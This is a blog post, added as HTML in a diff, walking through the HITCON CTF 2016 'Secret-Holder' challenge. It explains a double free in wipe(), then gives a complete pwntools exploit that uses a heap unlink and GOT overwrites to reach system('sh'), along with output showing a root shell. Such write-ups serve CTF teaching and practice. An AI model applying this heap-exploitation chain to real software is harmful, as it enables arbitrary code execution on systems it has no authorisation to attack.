@@ -1,0 +1,857 @@
+<!doctype html>
+
+
+
+
+<html class="theme-next pisces">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="ctf,double free,unlink," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/w0lfzhang.ico?v=5.0.2" />
+
+
+
+
+
+
+<meta name="description" content="Challenge程序的wipe功能有漏洞，可以造成double free。">
+<meta name="keywords" content="ctf,double free,unlink">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2016 HITCON CTF Secret-Holder">
+<meta property="og:url" content="http://yoursite.com/2016/10/30/2016-HITCON-CTF-Secret-Holder/index.html">
+<meta property="og:site_name" content="w0lfzhang&#39;s blog">
+<meta property="og:description" content="Challenge程序的wipe功能有漏洞，可以造成double free。">
+<meta property="og:updated_time" content="2017-05-10T07:54:14.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2016 HITCON CTF Secret-Holder">
+<meta name="twitter:description" content="Challenge程序的wipe功能有漏洞，可以造成double free。">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always"},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/10/30/2016-HITCON-CTF-Secret-Holder/"/>
+
+
+  <title> 2016 HITCON CTF Secret-Holder | w0lfzhang's blog </title>
+</head>
+
+<body itemscope itemtype="//schema.org/WebPage" lang="en">
+
+  
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-86514506-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?c3be9cb478c70b5f3b819ddd0ba381b6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="//schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">w0lfzhang's blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">pwn, pwn, pwn!!!</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                2016 HITCON CTF Secret-Holder
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-10-30T06:15:01+08:00" content="2016-10-30">
+              2016-10-30
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/ctf-practice/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf_practice</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/10/30/2016-HITCON-CTF-Secret-Holder/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/10/30/2016-HITCON-CTF-Secret-Holder/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+	 
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><p><a href="https://github.com/ctfs/write-ups-2016/tree/master/hitcon-ctf-2016/pwn/secret-holder-100" target="_blank" rel="external">程序</a>的wipe功能有漏洞，可以造成double free。<br><a id="more"></a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">__<span class="function">int64 <span class="title">wipe</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="comment">/*......*/</span></div><div class="line">  v3 = *MK_FP(__FS__, <span class="number">40L</span>L);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"Which Secret do you want to wipe?"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"1. Small secret"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"2. Big secret"</span>);</div><div class="line">  <span class="built_in">puts</span>(<span class="string">"3. Huge secret"</span>);</div><div class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">4u</span>LL);</div><div class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">4u</span>LL);</div><div class="line">  v0 = atoi(&amp;s);</div><div class="line">  <span class="keyword">switch</span> ( v0 )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">      <span class="built_in">free</span>(big_q);</div><div class="line">      big_status = <span class="number">0</span>;</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">      <span class="built_in">free</span>(huge_q);</div><div class="line">      huge_status = <span class="number">0</span>;</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">      <span class="built_in">free</span>(samll_q);</div><div class="line">      small_status = <span class="number">0</span>;</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> *MK_FP(__FS__, <span class="number">40L</span>L) ^ v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>按照下面步骤我们可以overlapping部分top chunk：<br>keep(small)–&gt;wipe(small)–&gt;keep(big)–&gt;wipe(small)–&gt;keep(small)。(because of malloc consolidates fastbins if there is a large request)<br>OK，现在samll chunk和部分top chunk已经被big chunk overlapping了。常规思路是往house of force()想，但是缺少条件，即malloc(size)的size不能指定任意大小。所以不行，只好放弃。当时我做这题只意识到这是一个double free，但是怎么利用就不知道了。那时堆的题做的不多，经验尚缺。<br>最后看wp时才知道关键在huge chunk上。第一次malloc huge chunk时是在mapping区域分配相应内存，但是free后再次malloc就会在main arean中了。真的很神奇<del>~</del>~最后我还是去看了下<a href="https://github.com/bminor/glibc/blob/master/malloc/malloc.c#L2909" target="_blank" rel="external">__libc_free</a>&amp;<a href="https://github.com/bminor/glibc/blob/master/malloc/malloc.c#L2246" target="_blank" rel="external">sysmalloc</a>。<br>所以最后我们只需要malloc一次huge chunk，然后free，最后再malloc就可以覆盖huge chunk的头部来unlink了。但是这题没给libc，这是另一个比较麻烦的地方，我还是用本机上的libc搞一下吧。</p>
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">debug = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> debug:</div><div class="line">    p = process(<span class="string">'./secret-holder'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    <span class="keyword">pass</span></div><div class="line"></div><div class="line">size_class = &#123;<span class="string">'small'</span>: <span class="string">'1'</span>, <span class="string">'big'</span>: <span class="string">'2'</span>, <span class="string">'huge'</span>: <span class="string">'3'</span>&#125;</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./libc.so'</span>)</div><div class="line"></div><div class="line">small_secret = <span class="number">0x6020B0</span></div><div class="line">big_secret = <span class="number">0x6020A0</span></div><div class="line">free_got = <span class="number">0x602018</span></div><div class="line">puts_plt = <span class="number">0x4006C0</span></div><div class="line">read_got = <span class="number">0x602040</span></div><div class="line">atoi_got = <span class="number">0x602070</span></div><div class="line"></div><div class="line">system_off = libc.symbols[<span class="string">'read'</span>] - libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep</span><span class="params">(size)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"3. Renew secret\n"</span>)</div><div class="line">    p.sendline(<span class="string">"1"</span>)</div><div class="line">    p.recvuntil(<span class="string">"3. Huge secret\n"</span>)</div><div class="line">    p.sendline(size_class[size])</div><div class="line">    p.recvuntil(<span class="string">"Tell me your secret: \n"</span>)</div><div class="line">    p.send(size)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">wipe</span><span class="params">(size)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"3. Renew secret\n"</span>)</div><div class="line">    p.sendline(<span class="string">"2"</span>)</div><div class="line">    p.recvuntil(<span class="string">"3. Huge secret\n"</span>)</div><div class="line">    p.sendline(size_class[size])</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">renew</span><span class="params">(size, content)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">"3. Renew secret\n"</span>)</div><div class="line">    p.sendline(<span class="string">"3"</span>)</div><div class="line">    p.recvuntil(<span class="string">"3. Huge secret\n"</span>)</div><div class="line">    p.sendline(size_class[size])</div><div class="line">    p.recvuntil(<span class="string">"Tell me your secret: \n"</span>)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line">keep(<span class="string">'small'</span>)</div><div class="line">wipe(<span class="string">'small'</span>)</div><div class="line">keep(<span class="string">'big'</span>)</div><div class="line">wipe(<span class="string">'small'</span>)</div><div class="line">keep(<span class="string">'small'</span>)</div><div class="line">keep(<span class="string">'huge'</span>)</div><div class="line">wipe(<span class="string">'huge'</span>)</div><div class="line">keep(<span class="string">'huge'</span>)</div><div class="line"></div><div class="line">payload1  = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(small_secret - <span class="number">0x18</span>) + p64(small_secret - <span class="number">0x10</span>)   <span class="comment">#although it's fastbin, it's in the range of samllbin</span></div><div class="line">payload1 += p64(<span class="number">0x20</span>) + p64(<span class="number">0x61A90</span>) </div><div class="line">renew(<span class="string">'big'</span>, payload1)</div><div class="line">wipe(<span class="string">'huge'</span>) </div><div class="line">payload2 = <span class="string">'a'</span> * <span class="number">8</span> + p64(free_got) + <span class="string">'b'</span> * <span class="number">8</span> + p64(big_secret) <span class="comment"># padding + big_secret + huge_secret + small_secret</span></div><div class="line"></div><div class="line">renew(<span class="string">'small'</span>, payload2)</div><div class="line">renew(<span class="string">'big'</span>, p64(puts_plt))</div><div class="line">renew(<span class="string">'small'</span>, p64(read_got)) <span class="comment"># *free_got = puts_plt, *big_secret = read_got</span></div><div class="line"></div><div class="line">wipe(<span class="string">'big'</span>)  <span class="comment"># puts(read_got)</span></div><div class="line">data = p.recvline()</div><div class="line">read_addr = u64(data[:<span class="number">6</span>] + <span class="string">'\x00\x00'</span>)</div><div class="line"><span class="keyword">print</span> <span class="string">"read_addr: "</span> + hex(read_addr)</div><div class="line">system_addr = read_addr - system_off</div><div class="line"><span class="keyword">print</span> <span class="string">"system_addr: "</span> + hex(system_addr)</div><div class="line"></div><div class="line">payload3 = p64(atoi_got) + <span class="string">'a'</span>*<span class="number">8</span> + p64(big_secret) + p64(<span class="number">1</span>) <span class="comment"># big_secret + huge_secret + small_secret + big_in_use_flag</span></div><div class="line">renew(<span class="string">'small'</span>, payload3)</div><div class="line">renew(<span class="string">'big'</span>, p64(system_addr)) <span class="comment">#*atoi_got = system_addr</span></div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'3. Renew secret\n'</span>)</div><div class="line">p.send(<span class="string">'sh'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@kali:~/Desktop# python secret-holder.py </div><div class="line">[+] Starting local process './secret-holder': Done</div><div class="line">[*] '/root/Desktop/libc.so'</div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">read_addr: 0x7fac66987a80</div><div class="line">system_addr: 0x7fac668eb870</div><div class="line">[*] Switching to interactive mode</div><div class="line"><span class="meta">$</span> id</div><div class="line">uid=0(root) gid=0(root) groups=0(root)</div></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag">#ctf</a>
+          
+            <a href="/tags/double-free/" rel="tag">#double free</a>
+          
+            <a href="/tags/unlink/" rel="tag">#unlink</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/10/28/2015-32C3-CTF-smashes/" rel="next" title="2015 32C3 CTF smashes">
+                <i class="fa fa-chevron-left"></i> 2015 32C3 CTF smashes
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/11/02/arm-instructions-learning/" rel="prev" title="arm instructions learning">
+                arm instructions learning <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="//schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/wolf.jpg"
+               alt="w0lfzhang" />
+          <p class="site-author-name" itemprop="name">w0lfzhang</p>
+          <p class="site-description motion-element" itemprop="description">Go slowly! Just slowly!</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">33</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">9</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">51</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://y0ung.tech" title="y0ung" target="_blank">y0ung</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Challenge"><span class="nav-number">1.</span> <span class="nav-text">Challenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solution"><span class="nav-number">2.</span> <span class="nav-text">Solution</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exp"><span class="nav-number">3.</span> <span class="nav-text">Exp</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">w0lfzhang</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+<span id="busuanzi_container_site_pv">
+    &nbsp; | &nbsp;Visited <span id="busuanzi_value_site_pv"></span> times
+</span>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.2"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'w0lfzhang';
+      var disqus_identifier = '2016/10/30/2016-HITCON-CTF-Secret-Holder/';
+      var disqus_title = "2016 HITCON CTF Secret-Holder";
+      var disqus_url = 'http://yoursite.com/2016/10/30/2016-HITCON-CTF-Secret-Holder/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        var disqus_config = function () {
+            this.page.url = disqus_url;
+            this.page.identifier = disqus_identifier;
+            this.page.title = disqus_title;
+        };
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = false;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = decodeURIComponent(data.url);
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title >= 0 || index_content >= 0 ){
+                                isMatch = true;
+								if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            } 
+							
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+
+</body>
+</html>
